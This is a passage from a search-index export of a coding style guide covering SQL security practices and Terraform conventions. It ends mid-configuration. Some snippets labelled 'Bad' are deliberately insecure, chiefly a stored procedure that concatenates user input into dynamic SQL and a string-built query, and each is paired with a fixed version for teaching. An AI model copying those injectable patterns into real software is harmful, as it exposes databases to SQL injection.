'server.crt'\n-- ssl_key_file = 'server.key'\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#sensitive-data-handling","title":"Sensitive Data Handling","text":"<p>Protect PII and implement data masking.</p> <pre><code>-- Good - Data masking for non-production environments\nCREATE VIEW users_masked AS\nSELECT\n    user_id,\n    CONCAT(LEFT(email, 3), '***@***.com') AS email_masked,\n    CONCAT(LEFT(phone, 3), '-***-****') AS phone_masked,\n    first_name,\n    'REDACTED' AS last_name_masked\nFROM users;\n\n-- Good - Row-level security (PostgreSQL)\nALTER TABLE sensitive_documents ENABLE ROW LEVEL SECURITY;\n\nCREATE POLICY user_documents_policy ON sensitive_documents\n    FOR SELECT\n    USING (owner_id = current_user_id());\n\n-- Good - Column-level permissions\nCREATE TABLE employees (\n    employee_id INT PRIMARY KEY,\n    first_name VARCHAR(100),\n    last_name VARCHAR(100),\n    salary DECIMAL(10,2),  -- Sensitive\n    ssn VARCHAR(11)        -- Highly sensitive\n);\n\n-- Grant access but hide sensitive columns\nGRANT SELECT (employee_id, first_name, last_name) ON employees TO hr_viewer;\n\n-- Only specific roles can see salary\nGRANT SELECT (employee_id, first_name, last_name, salary) ON employees TO hr_manager;\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#audit-logging","title":"Audit Logging","text":"<p>Enable comprehensive audit trails for security monitoring.</p> <pre><code>-- Good - Create audit log table\nCREATE TABLE audit_log (\n    audit_id BIGSERIAL PRIMARY KEY,\n    table_name VARCHAR(100) NOT NULL,\n    operation VARCHAR(10) NOT NULL,  -- INSERT, UPDATE, DELETE\n    user_name VARCHAR(100) NOT NULL,\n    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    old_values JSONB,\n    new_values JSONB,\n    ip_address INET\n);\n\n-- Good - Audit trigger for sensitive tables\nCREATE OR REPLACE FUNCTION audit_trigger_func()\nRETURNS TRIGGER AS $$\nBEGIN\n    IF (TG_OP = 'DELETE') THEN\n        INSERT INTO audit_log (table_name, operation, user_name, old_values, ip_address)\n        VALUES (TG_TABLE_NAME, TG_OP, current_user, row_to_json(OLD), inet_client_addr());\n        RETURN OLD;\n    ELSIF (TG_OP = 'UPDATE') THEN\n        INSERT INTO audit_log (table_name, operation, user_name, old_values, new_values, ip_address)\n        VALUES (TG_TABLE_NAME, TG_OP, current_user, row_to_json(OLD), row_to_json(NEW), inet_client_addr());\n        RETURN NEW;\n    ELSIF (TG_OP = 'INSERT') THEN\n        INSERT INTO audit_log (table_name, operation, user_name, new_values, ip_address)\n        VALUES (TG_TABLE_NAME, TG_OP, current_user, row_to_json(NEW), inet_client_addr());\n        RETURN NEW;\n    END IF;\nEND;\n$$ LANGUAGE plpgsql;\n\n-- Apply audit trigger to sensitive tables\nCREATE TRIGGER users_audit_trigger\n    AFTER INSERT OR UPDATE OR DELETE ON users\n    FOR EACH ROW EXECUTE FUNCTION audit_trigger_func();\n\nCREATE TRIGGER financial_transactions_audit\n    AFTER INSERT OR UPDATE OR DELETE ON financial_transactions\n    FOR EACH ROW EXECUTE FUNCTION audit_trigger_func();\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#backup-security","title":"Backup Security","text":"<p>Protect database backups with encryption.</p> <pre><code>## Bad - Unencrypted backup\npg_dump myapp &gt; backup.sql  # Plain text backup!\nmysqldump -u root -p myapp &gt; backup.sql  # No encryption!\n\n## Good - Encrypted backup (PostgreSQL)\npg_dump myapp | gpg --encrypt --recipient admin@example.com &gt; backup.sql.gpg\n\n## Good - Encrypted backup with compression\npg_dump myapp | gzip | gpg --encrypt --recipient admin@example.com &gt; backup.sql.gz.gpg\n\n## Good - Secure backup permissions\nchmod 600 backup.sql.gpg  # Only owner can read/write\n\n## Good - Store backups securely\naws s3 cp backup.sql.gpg s3://secure-backups/ --sse aws:kms --sse-kms-key-id alias/backup-key\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#connection-security","title":"Connection Security","text":"<p>Enforce secure database connections.</p> <pre><code>-- Good - Require SSL for specific users\nALTER USER app_user REQUIRE SSL;\n\n-- Good - Restrict connections by IP (MySQL)\nCREATE USER 'app_user'@'10.0.1.%' IDENTIFIED BY 'SecurePassword123!';  -- Specific subnet only\n\n-- Good - Disable remote root access\nDELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');\nFLUSH PRIVILEGES;\n\n-- Good - Connection limits\nALTER USER app_user WITH CONNECTION LIMIT 50;  -- Prevent connection exhaustion\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#secure-stored-procedures","title":"Secure Stored Procedures","text":"<p>Validate inputs and use security definer carefully.</p> <pre><code>-- Bad - Stored procedure vulnerable to injection\nCREATE PROCEDURE get_user_by_email(IN email_input VARCHAR(255))\nBEGIN\n    SET @query = CONCAT('SELECT * FROM users WHERE email = \"', email_input, '\"');  -- VULNERABLE!\n    PREPARE stmt FROM @query;\n    EXECUTE stmt;\n    DEALLOCATE PREPARE stmt;\nEND;\n\n-- Good - Use parameterized queries in procedures\nCREATE PROCEDURE get_user_by_email(IN email_input VARCHAR(255))\nBEGIN\n    SELECT user_id, email, first_name, last_name\n    FROM users\n    WHERE email = email_input;  -- Safe - parameterized\nEND;\n\n-- Good - Input validation in stored procedures\nCREATE PROCEDURE create_user(\n    IN email_input VARCHAR(255),\n    IN first_name_input VARCHAR(100)\n)\nBEGIN\n    -- Validate email format\n    IF email_input NOT REGEXP '^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\\\.[A-Za-z]{2,}$' THEN\n        SIGNAL SQLSTATE '45000'\n        SET MESSAGE_TEXT = 'Invalid email format';\n    END IF;\n\n    -- Validate name length\n    IF LENGTH(first_name_input) &lt; 2 OR LENGTH(first_name_input) &gt; 100 THEN\n        SIGNAL SQLSTATE '45000'\n        SET MESSAGE_TEXT = 'Invalid name length';\n    END IF;\n\n    INSERT INTO users (email, first_name) VALUES (email_input, first_name_input);\nEND;\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#prevent-information-disclosure","title":"Prevent Information Disclosure","text":"<p>Avoid exposing sensitive information in error messages.</p> <pre><code>-- Bad - Exposing table structure in errors\nSELECT * FROM users WHERE user_id = 'invalid';  -- Error reveals table schema!\n\n-- Good - Handle errors gracefully (application level)\n-- Python example\ntry:\n    cursor.execute(\"SELECT * FROM users WHERE user_id = %s\", (user_id,))\nexcept DatabaseError as e:\n    # Log detailed error server-side\n    logger.error(f\"Database error: {str(e)}\")\n    # Return generic error to client\n    return {\"error\": \"An error occurred processing your request\"}\n\n-- Good - Use views to hide sensitive columns\nCREATE VIEW public_user_profile AS\nSELECT user_id, username, avatar_url, created_at\nFROM users;  -- Hides email, password_hash, etc.\n\nGRANT SELECT ON public_user_profile TO app_user;\nREVOKE SELECT ON users FROM app_user;  -- Deny access to full table\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#anti-patterns","title":"Anti-Patterns","text":"","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#avoid-select-in-production","title":"\u274c Avoid: SELECT * in Production","text":"<pre><code>-- Bad - Over-fetching data\nSELECT * FROM users;\n\n-- Good - Explicit columns\nSELECT user_id, email, first_name, last_name FROM users;\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#avoid-n1-queries","title":"\u274c Avoid: N+1 Queries","text":"<pre><code>-- Bad - N+1 query problem (fetching orders for each user in application loop)\n-- Application code loop:\n-- for each user:\n--     SELECT * FROM orders WHERE user_id = ?\n\n-- Good - Single query with JOIN\nSELECT\n    u.user_id,\n    u.email,\n    o.order_id,\n    o.total\nFROM users u\nLEFT JOIN orders o ON u.user_id = o.user_id;\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#avoid-unparameterized-queries","title":"\u274c Avoid: Unparameterized Queries","text":"<pre><code>-- Bad - SQL injection risk\n-- query = \"SELECT * FROM users WHERE email = '\" + user_input + \"'\"\n\n-- Good - Parameterized query\n-- query = \"SELECT * FROM users WHERE email = $1\"\n-- execute(query, [user_input])\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#avoid-missing-where-in-updatedelete","title":"\u274c Avoid: Missing WHERE in UPDATE/DELETE","text":"<pre><code>-- Bad - Updates all rows!\nUPDATE users SET status = 'inactive';\n\n-- Good - Specific WHERE clause\nUPDATE users\nSET status = 'inactive'\nWHERE last_login &lt; CURRENT_DATE - INTERVAL '90 days';\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#avoid-using-distinct-to-fix-duplicates","title":"\u274c Avoid: Using DISTINCT to Fix Duplicates","text":"<pre><code>-- Bad - DISTINCT hides the real problem\nSELECT DISTINCT\n    u.user_id,\n    u.email,\n    o.order_id\nFROM users u\nLEFT JOIN orders o ON u.user_id = o.user_id;  -- \u274c Multiple orders create duplicates\n\n-- Good - Fix the JOIN logic\nSELECT\n    u.user_id,\n    u.email,\n    ARRAY_AGG(o.order_id) AS order_ids\nFROM users u\nLEFT JOIN orders o ON u.user_id = o.user_id\nGROUP BY u.user_id, u.email;\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#avoid-not-using-indexes","title":"\u274c Avoid: Not Using Indexes","text":"<pre><code>-- Bad - Querying without indexes\nCREATE TABLE users (\n    user_id INT PRIMARY KEY,\n    email VARCHAR(255),\n    status VARCHAR(50)\n);\n-- Queries on email and status will be slow!\n\n-- Good - Add appropriate indexes\nCREATE TABLE users (\n    user_id INT PRIMARY KEY,\n    email VARCHAR(255) NOT NULL UNIQUE,\n    status VARCHAR(50) NOT NULL,\n    created_at TIMESTAMP NOT NULL DEFAULT NOW()\n);\n\nCREATE INDEX idx_users_status ON users(status);\nCREATE INDEX idx_users_created_at ON users(created_at);\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#avoid-large-in-clauses","title":"\u274c Avoid: Large IN Clauses","text":"<pre><code>-- Bad - Large IN clause (thousands of IDs)\nSELECT * FROM orders\nWHERE user_id IN (1, 2, 3, ..., 10000);  -- \u274c Performance issues!\n\n-- Good - Use temporary table or JOIN\nCREATE TEMP TABLE temp_user_ids (user_id INT);\nINSERT INTO temp_user_ids VALUES (1), (2), (3), ..., (10000);\n\nSELECT o.*\nFROM orders o\nINNER JOIN temp_user_ids t ON o.user_id = t.user_id;\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#comments","title":"Comments","text":"<pre><code>-- Single-line comment for simple explanations\nSELECT user_id, email FROM users; -- Active users only\n\n/*\n * Multi-line comment for complex logic\n * This query calculates user lifetime value based on:\n * - Total completed orders\n * - Average order value\n * - Customer tenure\n */\nSELECT\n    u.user_id,\n    u.email,\n    COUNT(o.order_id) AS total_orders,\n    AVG(o.total) AS avg_order_value,\n    EXTRACT(YEAR FROM AGE(CURRENT_DATE, u.created_at)) AS years_active\nFROM users u\nLEFT JOIN orders o ON u.user_id = o.user_id\nWHERE o.status = 'completed'\nGROUP BY u.user_id, u.email, u.created_at;\n</code></pre>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#references","title":"References","text":"","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#sql-standards","title":"SQL Standards","text":"<ul> <li>SQL-92 Standard</li> <li>Modern SQL - SQL features across databases</li> </ul>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#database-specific-documentation","title":"Database-Specific Documentation","text":"<ul> <li>PostgreSQL Documentation</li> <li>MySQL Documentation</li> <li>SQL Server Documentation</li> </ul>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/sql/#tools","title":"Tools","text":"<ul> <li>sqlfluff - SQL linter</li> <li>pgFormatter - PostgreSQL formatter</li> <li>DBeaver - Universal database tool</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["sql","database","queries","data","standards"]},{"location":"02_language_guides/terraform/","title":"Terraform Style Guide","text":"","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#language-overview","title":"Language Overview","text":"<p>Terraform is a declarative Infrastructure as Code (IaC) tool that enables provisioning and managing cloud resources across multiple providers through HCL (HashiCorp Configuration Language).</p>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#key-characteristics","title":"Key Characteristics","text":"<ul> <li>Paradigm: Declarative infrastructure as code</li> <li>Language: HCL (HashiCorp Configuration Language)</li> <li>Type System: Static typing with primitive, complex, and structural types</li> <li>State Management: Remote state with locking for collaboration</li> <li>Provider Ecosystem: 3000+ providers for cloud, SaaS, and custom resources</li> <li>Version Support: Targets Terraform versions 1.5.x through 1.9.x</li> </ul>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#primary-use-cases","title":"Primary Use Cases","text":"<ul> <li>Multi-cloud infrastructure provisioning (AWS, Azure, GCP, etc.)</li> <li>Kubernetes cluster and resource management</li> <li>Network infrastructure and security groups</li> <li>Database and storage provisioning</li> <li>CI/CD pipeline infrastructure</li> <li>Monitoring and observability stack deployment</li> </ul>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#quick-reference","title":"Quick Reference","text":"Category Convention Example Notes Naming Resources <code>snake_case</code> <code>aws_vpc.main</code>, <code>aws_subnet.private</code> Type + descriptive identifier Variables <code>snake_case</code> <code>vpc_cidr</code>, <code>instance_type</code> Descriptive, no type prefix Outputs <code>snake_case</code> <code>vpc_id</code>, <code>subnet_ids</code> What is being output Modules <code>kebab-case</code> <code>vpc-network</code>, <code>rds-database</code> Folder names, lowercase with hyphens Locals <code>snake_case</code> <code>common_tags</code>, <code>subnet_count</code> Internal computed values Data Sources <code>snake_case</code> <code>data.aws_ami.ubuntu</code> Prefix with purpose or resource type Files Main Config <code>main.tf</code> <code>main.tf</code> Primary resource definitions Variables <code>variables.tf</code> <code>variables.tf</code> All variable declarations Outputs <code>outputs.tf</code> <code>outputs.tf</code> All output declarations Providers <code>providers.tf</code> or <code>versions.tf</code> <code>providers.tf</code> Provider configuration Data Sources <code>data.tf</code> <code>data.tf</code> External data lookups Locals <code>locals.tf</code> <code>locals.tf</code> Local value computations Formatting Indentation 2 spaces <code>resource \"aws_vpc\" \"main\" {</code> Consistent 2-space indentation Line Length 120 characters <code># Maximum line length</code> Keep lines readable Blank Lines 1 between blocks <code>resource \"...\" {}\\n\\nresource \"...\" {}</code> Separate logical blocks Variables Description Always required <code>description = \"VPC CIDR block\"</code> Document purpose and usage Type Explicit types <code>type = string</code>, <code>type = list(string)</code> Never use <code>any</code> Default Optional values only <code>default = \"10.0.0.0/16\"</code> Required vars have no default Validation Use when needed <code>validation { condition = ... }</code> Enforce constraints Modules Source Semantic versioning <code>source = \"terraform-aws-modules/vpc/aws\"</code> Pin versions Version Always specify <code>version = \"~&gt; 5.0\"</code> Use version constraints State Backend Remote with locking <code>backend \"s3\" { ... }</code> Never local for teams Workspace Environment isolation <code>terraform workspace select prod</code> Separate environments","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#naming-conventions","title":"Naming Conventions","text":"","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#resource-names","title":"Resource Names","text":"<p>Use snake_case for all Terraform resource identifiers:</p> <pre><code>## Good\nresource \"aws_instance\" \"web_server\" {\n  ami           = var.ami_id\n  instance_type = var.instance_type\n}\n\nresource \"aws_security_group\" \"application_sg\" {\n  name = \"app-${var.environment}-sg\"\n}\n\n## Bad\nresource \"aws_instance\" \"WebServer\" {      # PascalCase - avoid\n  ami = var.ami_id\n}\n\nresource \"aws_security_group\" \"app-sg\" {   # kebab-case in identifier - avoid\n  name = \"app-sg\"\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#variable-names","title":"Variable Names","text":"<p>Use snake_case with descriptive names:</p> <pre><code>## Good\nvariable \"vpc_cidr_block\" {\n  type        = string\n  description = \"CIDR block for VPC\"\n}\n\nvariable \"instance_count\" {\n  type        = number\n  description = \"Number of EC2 instances to create\"\n  default     = 2\n}\n\n## Bad\nvariable \"vpcCIDR\" {           # camelCase - avoid\n  type = string\n}\n\nvariable \"cnt\" {               # Abbreviation - avoid\n  type = number\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#output-names","title":"Output Names","text":"<p>Use snake_case for outputs, prefixed by resource type when exporting IDs:</p> <pre><code>## Good\noutput \"vpc_id\" {\n  description = \"ID of the created VPC\"\n  value       = aws_vpc.main.id\n}\n\noutput \"instance_public_ips\" {\n  description = \"Public IP addresses of EC2 instances\"\n  value       = aws_instance.web[*].public_ip\n}\n\n## Bad\noutput \"VpcId\" {               # PascalCase - avoid\n  value = aws_vpc.main.id\n}\n\noutput \"ips\" {                 # Too vague - avoid\n  value = aws_instance.web[*].public_ip\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#module-names","title":"Module Names","text":"<p>Use kebab-case for module directory names:</p> <pre><code>modules/\n\u251c\u2500\u2500 vpc-network/\n\u2502   \u251c\u2500\u2500 main.tf\n\u2502   \u251c\u2500\u2500 variables.tf\n\u2502   \u2514\u2500\u2500 outputs.tf\n\u251c\u2500\u2500 ec2-instance/\n\u2502   \u2514\u2500\u2500 ...\n\u2514\u2500\u2500 security-groups/\n    \u2514\u2500\u2500 ...\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#file-names","title":"File Names","text":"<p>Standard Terraform file naming conventions:</p> <pre><code>## Root module structure\nmain.tf                 # Primary resource definitions\nvariables.tf            # Input variable declarations\noutputs.tf              # Output value definitions\nproviders.tf            # Provider configuration\nversions.tf             # Terraform and provider version constraints\nbackend.tf              # Remote backend configuration\nlocals.tf               # Local value definitions (optional)\ndata.tf                 # Data source definitions (optional)\nterraform.tfvars        # Variable value assignments (gitignored)\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#module-structure-and-organization","title":"Module Structure and Organization","text":"","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#standard-module-layout","title":"Standard Module Layout","text":"<pre><code>modules/vpc-network/\n\u251c\u2500\u2500 README.md                    # Module documentation\n\u251c\u2500\u2500 main.tf                      # Primary resources\n\u251c\u2500\u2500 variables.tf                 # Input variables\n\u251c\u2500\u2500 outputs.tf                   # Output values\n\u251c\u2500\u2500 versions.tf                  # Version constraints\n\u251c\u2500\u2500 examples/\n\u2502   \u2514\u2500\u2500 basic/\n\u2502       \u251c\u2500\u2500 main.tf\n\u2502       \u2514\u2500\u2500 variables.tf\n\u2514\u2500\u2500 tests/\n    \u2514\u2500\u2500 vpc_test.go              # Terratest tests\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#file-organization-best-practices","title":"File Organization Best Practices","text":"<pre><code>## main.tf - Group related resources together with comments\n#----------------------------------------------------------------------\n## VPC and Networking\n#----------------------------------------------------------------------\nresource \"aws_vpc\" \"main\" {\n  cidr_block           = var.vpc_cidr_block\n  enable_dns_hostnames = true\n  enable_dns_support   = true\n\n  tags = merge(\n    var.common_tags,\n    {\n      Name = \"${var.project}-${var.environment}-vpc\"\n    }\n  )\n}\n\nresource \"aws_subnet\" \"public\" {\n  count                   = length(var.availability_zones)\n  vpc_id                  = aws_vpc.main.id\n  cidr_block              = cidrsubnet(var.vpc_cidr_block, 4, count.index)\n  availability_zone       = var.availability_zones[count.index]\n  map_public_ip_on_launch = true\n\n  tags = merge(\n    var.common_tags,\n    {\n      Name = \"${var.project}-${var.environment}-public-${count.index + 1}\"\n      Type = \"public\"\n    }\n  )\n}\n\n#----------------------------------------------------------------------\n## Internet Gateway\n#----------------------------------------------------------------------\nresource \"aws_internet_gateway\" \"main\" {\n  vpc_id = aws_vpc.main.id\n\n  tags = merge(\n    var.common_tags,\n    {\n      Name = \"${var.project}-${var.environment}-igw\"\n    }\n  )\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#variable-management","title":"Variable Management","text":"","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#variable-definitions-with-validation","title":"Variable Definitions with Validation","text":"<p>All variables must include <code>type</code>, <code>description</code>, and validation when applicable:</p> <pre><code>## variables.tf\nvariable \"environment\" {\n  type        = string\n  description = \"Deployment environment (dev, staging, prod)\"\n\n  validation {\n    condition     = contains([\"dev\", \"staging\", \"prod\"], var.environment)\n    error_message = \"Environment must be dev, staging, or prod.\"\n  }\n}\n\nvariable \"instance_type\" {\n  type        = string\n  description = \"EC2 instance type\"\n  default     = \"t3.micro\"\n\n  validation {\n    condition     = can(regex(\"^t[23]\\\\.(nano|micro|small|medium|large)$\", var.instance_type))\n    error_message = \"Instance type must be a valid T2 or T3 size.\"\n  }\n}\n\nvariable \"vpc_cidr_block\" {\n  type        = string\n  description = \"CIDR block for VPC (must be /16)\"\n\n  validation {\n    condition     = can(cidrhost(var.vpc_cidr_block, 0)) &amp;&amp; tonumber(split(\"/\", var.vpc_cidr_block)[1]) == 16\n    error_message = \"VPC CIDR block must be a valid /16 network.\"\n  }\n}\n\nvariable \"backup_retention_days\" {\n  type        = number\n  description = \"Number of days to retain backups\"\n  default     = 7\n\n  validation {\n    condition     = var.backup_retention_days &gt;= 1 &amp;&amp; var.backup_retention_days &lt;= 35\n    error_message = \"Backup retention must be between 1 and 35 days.\"\n  }\n}\n\nvariable \"common_tags\" {\n  type        = map(string)\n  description = \"Common tags to apply to all resources\"\n  default     = {}\n}\n\nvariable \"allowed_cidr_blocks\" {\n  type        = list(string)\n  description = \"List of CIDR blocks allowed to access resources\"\n\n  validation {\n    condition     = alltrue([for cidr in var.allowed_cidr_blocks : can(cidrhost(cidr, 0))])\n    error_message = \"All CIDR blocks must be valid IPv4 CIDR notation.\"\n  }\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#complex-variable-types","title":"Complex Variable Types","text":"<pre><code>## Object type for structured configuration\nvariable \"database_config\" {\n  type = object({\n    engine               = string\n    engine_version       = string\n    instance_class       = string\n    allocated_storage    = number\n    multi_az             = bool\n    backup_retention_period = number\n  })\n  description = \"RDS database configuration\"\n\n  validation {\n    condition     = contains([\"mysql\", \"postgres\", \"mariadb\"], var.database_config.engine)\n    error_message = \"Database engine must be mysql, postgres, or mariadb.\"\n  }\n}\n\n## Map of objects for multiple similar resources\nvariable \"applications\" {\n  type = map(object({\n    instance_count = number\n    instance_type  = string\n    disk_size      = number\n  }))\n  description = \"Application configurations\"\n  default     = {}\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#resource-definitions-and-naming-patterns","title":"Resource Definitions and Naming Patterns","text":"","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#resource-naming-pattern","title":"Resource Naming Pattern","text":"<p>Use interpolation to create consistent, environment-aware resource names:</p> <pre><code>## Pattern: ${project}-${environment}-${resource_type}-${identifier}\nresource \"aws_s3_bucket\" \"application_data\" {\n  bucket = \"${var.project}-${var.environment}-app-data\"\n\n  tags = merge(\n    var.common_tags,\n    {\n      Name        = \"${var.project}-${var.environment}-app-data\"\n      Environment = var.environment\n      ManagedBy   = \"terraform\"\n    }\n  )\n}\n\nresource \"aws_security_group\" \"web_server\" {\n  name        = \"${var.project}-${var.environment}-web-sg\"\n  description = \"Security group for web servers in ${var.environment}\"\n  vpc_id      = aws_vpc.main.id\n\n  tags = {\n    Name        = \"${var.project}-${var.environment}-web-sg\"\n    Environment = var.environment\n    ManagedBy   = \"terraform\"\n  }\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#tagging-conventions","title":"Tagging Conventions","text":"<p>Apply consistent tags to ALL resources that support tagging:</p> <pre><code>## locals.tf - Define common tags\nlocals {\n  common_tags = {\n    Project     = var.project\n    Environment = var.environment\n    ManagedBy   = \"terraform\"\n    Owner       = var.team_email\n    CostCenter  = var.cost_center\n    Terraform   = \"true\"\n  }\n}\n\n## main.tf - Use tags consistently\nresource \"aws_instance\" \"web\" {\n  ami           = data.aws_ami.ubuntu.id\n  instance_type = var.instance_type\n\n  tags = merge(\n    local.common_tags,\n    {\n      Name = \"${var.project}-${var.environment}-web-${count.index + 1}\"\n      Role = \"web-server\"\n    }\n  )\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#dynamic-blocks","title":"Dynamic Blocks","text":"<p>Use dynamic blocks for repeating nested blocks:</p> <pre><code>resource \"aws_security_group\" \"application\" {\n  name   = \"${var.project}-${var.environment}-app-sg\"\n  vpc_id = aws_vpc.main.id\n\n  dynamic \"ingress\" {\n    for_each = var.ingress_rules\n    content {\n      description = ingress.value.description\n      from_port   = ingress.value.from_port\n      to_port     = ingress.value.to_port\n      protocol    = ingress.value.protocol\n      cidr_blocks = ingress.value.cidr_blocks\n    }\n  }\n\n  tags = local.common_tags\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#output-definitions","title":"Output Definitions","text":"<p>Outputs should be well-documented and include sensitive flag when needed:</p> <pre><code>## outputs.tf\noutput \"vpc_id\" {\n  description = \"ID of the VPC\"\n  value       = aws_vpc.main.id\n}\n\noutput \"public_subnet_ids\" {\n  description = \"List of public subnet IDs\"\n  value       = aws_subnet.public[*].id\n}\n\noutput \"database_endpoint\" {\n  description = \"RDS database endpoint\"\n  value       = aws_db_instance.main.endpoint\n}\n\noutput \"database_password\" {\n  description = \"RDS database master password\"\n  value       = aws_db_instance.main.password\n  sensitive   = true\n}\n\noutput \"instance_details\" {\n  description = \"Map of instance IDs to public IPs\"\n  value = {\n    for instance in aws_instance.web :\n    instance.id =&gt; instance.public_ip\n  }\n}\n\noutput \"load_balancer_dns\" {\n  description = \"DNS name of the load balancer\"\n  value       = aws_lb.main.dns_name\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#data-sources","title":"Data Sources","text":"<p>Use data sources for referencing existing resources:</p> <pre><code>## data.tf\ndata \"aws_availability_zones\" \"available\" {\n  state = \"available\"\n}\n\ndata \"aws_ami\" \"ubuntu\" {\n  most_recent = true\n  owners      = [\"099720109477\"] # Canonical\n\n  filter {\n    name   = \"name\"\n    values = [\"ubuntu/images/hvm-ssd/ubuntu-jammy-22.04-amd64-server-*\"]\n  }\n\n  filter {\n    name   = \"virtualization-type\"\n    values = [\"hvm\"]\n  }\n}\n\ndata \"aws_caller_identity\" \"current\" {}\n\ndata \"aws_region\" \"current\" {}\n\n## Use data sources in resources\nresource \"aws_subnet\" \"private\" {\n  count             = length(data.aws_availability_zones.available.names)\n  vpc_id            = aws_vpc.main.id\n  cidr_block        = cidrsubnet(var.vpc_cidr_block, 4, count.index + 10)\n  availability_zone = data.aws_availability_zones.available.names[count.index]\n\n  tags = {\n    Name = \"${var.project}-${var.environment}-private-${count.index + 1}\"\n  }\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#provider-configuration","title":"Provider Configuration","text":"","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#provider-version-constraints","title":"Provider Version Constraints","text":"<pre><code>## versions.tf\nterraform {\n  required_version = \"&gt;= 1.5.0, &lt; 2.0.0\"\n\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \"~&gt; 5.0\"\n    }\n    random = {\n      source  = \"hashicorp/random\"\n      version = \"~&gt; 3.5\"\n    }\n  }\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#provider-setup","title":"Provider Setup","text":"<pre><code>## providers.tf\nprovider \"aws\" {\n  region = var.aws_region\n\n  default_tags {\n    tags = {\n      ManagedBy   = \"terraform\"\n      Project     = var.project\n      Environment = var.environment\n    }\n  }\n}\n\n## Multi-region provider configuration\nprovider \"aws\" {\n  alias  = \"us_west_2\"\n  region = \"us-west-2\"\n}\n\nprovider \"aws\" {\n  alias  = \"us_east_1\"\n  region = \"us-east-1\"\n}\n\n## Use aliased provider\nresource \"aws_s3_bucket\" \"backup\" {\n  provider = aws.us_west_2\n  bucket   = \"${var.project}-backup\"\n}\n</code></pre>","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#state-management","title":"State Management","text":"","tags":["terraform","iac","infrastructure-as-code","hashicorp","devops"]},{"location":"02_language_guides/terraform/#remote-backend-configuration","title":"Remote Backend Configuration","text":"<pre><code>## backend.tf\nterraform {\n  backend \"s3\" {\n    bucket         = \"my-terraform-state-bucket\"\n    key            = \"projects/my-app/terraform.tfstate\"\n    region         = \"us-east-1\"\n    encrypt        = true\n    dynamodb_table = \"terraform-state-locks\"\n    kms_key_id     = 